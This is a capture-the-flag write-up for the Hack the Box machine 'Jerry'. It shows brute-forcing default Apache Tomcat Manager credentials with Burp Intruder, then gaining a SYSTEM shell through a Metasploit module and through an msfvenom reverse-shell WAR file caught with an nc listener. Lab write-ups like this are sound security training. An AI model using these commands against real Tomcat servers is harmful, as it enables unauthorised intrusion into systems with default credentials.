=======================================================

## Introduction

=======================================================

Jerry is an easy machine on the Hack the Box platform that introduces us to Apache Tomcat vulnerabilities.

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

For Jerry, we will use our web browser and Burp suite to enumerate the site and discover some default credentials in use on the Apache Tomcat web manager. From there we upload a malicious .war file which gives us our reverse shell.

-1- nmap

-2- web browser enumeration

-3- Burp Suite

-4- bash scripting

-5- msfconsole 

-6- msf module: exploit/multi/http/tomcat_mgr_upload

-7- msfvenom

-8- nc

<p>&nbsp;</p>
=======================================================

## Scanning and Enumeration

=======================================================

nmap -A -T4 10.10.10.95

![](/images/jerry/2. nmap.png)

All we see is port 8080 open, running Apache Tomcat 7.0.88.  O/S looks like it could be Windows.  Let's go visit the web page and see what we find:

![](/images/jerry/3. website.png)

This is a fairly default Tomcat webpage, and it even has the buttons for Server Status, Manager App, and Host Manager. Looks like we might have a way in!

If we click on the “Manager App” button we are presented with a login request:

![](/images/jerry/4. auth.png)

Now we can try some default credentials.  Let's check Google:

![](/images/jerry/5. google.png)

We find a github site with a list of credentials: [https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown)

We can use this list in a brute force, but we will use Burp Suite:

Set your Firefox to use Burp as its web proxy (127.0.0.1 port 8080)

Surf back to Jerry's web page http://10.10.10.95:8080

Forward the web requests through Burp's Intercept tab and then click on the Manager app.

Forward the initial request until you get the Username/Password box:

![](/images/jerry/6. auth-burp.png)

Here I chose to just try one from the list of default creds:  tomcat // tomcat

Click OK and go back to Burp

![](/images/jerry/7. burp-intercept.png)

Now we see we have a GET request to /manager  and at the bottom of the request is an Authorization field with what looks like Base64 encoded text.

Right-click on the Base64 text and choose “Send to Decoder” then click on the Decoder tab

On the right, choose “Decode as” and then select Base64, in the bottom window you should see it decode to: tomcat:tomcat

![](/images/jerry/8. burp-decoder.png)

Go back to the Intercept tab and forward the request to see if it works.  (It won't).

Input tomcat:tomcat again into the Authorization field and this time in Burp send it to Repeater and Intruder

On repeater you can go ahead and send the request through:

![](/images/jerry/9. burp-repeater.png)

You will see on the right side the Response from the server is “401 Unauthorized” meaning the creds are not valid.

So, what we are going to do now is take the default creds list from github and paste them into a creds.txt file on our Kali machine and then use Burp's Intruder to brute force them. Based on what we saw when we Base64 decoded the request earlier, the format we need to replicate is username : password

Make your text file look like this:

![](/images/jerry/10. default-creds.png)

Save the text file and go to a terminal window in Kali. We can use the following 1-liner bash script to base64 encode all our username/password combinations:

    for cred in $(cat creds.txt); do echo -n $cred | base64; done

![](/images/jerry/11. bash-b64.png)

Now copy all of the base64 text and go to Burp's Intruder tab. On the Positions sub-tab we need to select the base64 encoded string on our request and then click “Add” on the right side:

![](/images/jerry/12. burp-intruder.png)

Next click the Payloads sub-tab and then click Paste under Payload options, then scroll down and uncheck the “URL encode” option:

![](/images/jerry/13. burp-payloads.png)

Click “Start Attack” As the results come in, click to sort them by Length:

![](/images/jerry/14. burp-intruder_2.png)

When complete, you should see one with a Status code of 200, and the rest with some sort of 400 code (either 401 or 403).  The 200 code has our valid creds!

You will also see the Length of the response is much larger for the valid creds as we would expect. You can double click that text under the Payload fileld, and then highlight the specific text to send to Decoder.  Decode the base64:

![](/images/jerry/15. burp-decoder_2.png)

And we have our default creds that work:  tomcat : s3cret

At this point you can turn off Burp Suite's intercept and close it altogether. Also set your Firefox browser to use System Proxy settings again instead of trying to use Burp.

Back over on the web browser let's log in to the Manager app using tomcat : s3cret

![](/images/jerry/16. manager_1.png)
![](/images/jerry/16. manager_2.png)
![](/images/jerry/16. manager_2.png)

Here we see a listing of the applications running on this Tomcat server, and also a place to Deploy a WAR file of our own. Lastly at the very bottom we see some Server information:

Windows Server 2012 R2, 64-bit architecture, Apache Tomcat 7.0.88, JVM version 1.8.0_171-b11  (Oracle), and lastly, Copyright 1999-2018. 

A note here on why the Copyright date may be of use: If we did search for exploits anywhere, and the disclosure or proof of concept code has a date later than the copyright date (2018 in this case) it will have a better chance of working.


<p>&nbsp;</p>
=======================================================

## Exploitation using Metasploit

=======================================================

For Metasploit, we start msfconsole and search for tomcat:

    msfconsole
    
    search tomcat

![](/images/jerry/27. meta_1.png)
![](/images/jerry/27. meta_2.png)

We are going to use option 17, exploit/multi/http/tomcat_mgr_upload

    use 17
    
    show options
    
![](/images/jerry/28. options.png)

Looking at the options, we need to set a few of them:

    set HttpPassword s3cret
    set HttpUsername tomcat
    set RHOSTS 10.10.10.95
    set RPORT 8080
    set LHOST 10.10.14.30
    set LPORT 17011

![](/images/jerry/29. set.png)

If everything looks good there, we can now run the exploit:

    run

    sysinfo
    
    getuid
    
![](/images/jerry/30. run.png)

And we have a meterpreter shell! By running the ‘sysinfo’ and ‘getuid' commands we have a bit more information. Let's drop to a shell:

    shell
    
    whoami
    
![](/images/jerry/31. shell.png)

We have system level privileges, success! Let's go get our flags:

    cd C:\Users
    
    dir

![](/images/jerry/32. enum.png)

On this machine, both flags are in one document, in a slightly different location than normal:

    type "Administrator\Desktop\flags\2 for the price of 1.txt"

![](/images/jerry/26. flags.png)

And there we have our flags.
     

<p>&nbsp;</p>
=======================================================

## Manual Exploitation

=======================================================

We are going to deploy a WAR file that will execute a reverse shell when run. Let's Google "msfvenom war payloads":

![](/images/jerry/17. google-msfvenom.png)

And the first link that comes up for me is a gold mine: [https://netsec.ws/?p=331](https://netsec.ws/?p=331)

![](/images/jerry/18 war.png)

So we need to make a command like this:

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=17011 -f war > win_the.war

![](/images/jerry/19 msfvenom.png)

Now we upload it using the Tomcat Manager app:

![](/images/jerry/20. upload.png)

Click the “Browse” button and then navigate to your .war file.  Then click Deploy.

The page should refresh and you should see your war file as an application:

![](/images/jerry/21. application.png)

In a separate terminal window, set up your listener on the port you chose for LPORT:

    nc -lvnp 17011

![](/images/jerry/22. nc-listener.png)

Now browse to your application:  http://10.10.10.95:8080/win_the

In your nc listener you should see:

![](/images/jerry/23. nc-connection.png)

And in our terminal window we have a shell! Let's see what privs we have:

![](/images/jerry/24. whoami.png)

And we are system!  Success! Let's go get some flags.

On this box, the flags are in a slightly different location: C:\Users\Administrator\flags\

![](/images/jerry/25 flags.png)

And there we have our flags.

## Final Code

=======================================================

bash one-liner to read a file and then base64 encode each line:

    for cred in $(cat creds.txt); do echo -n $cred | base64; done
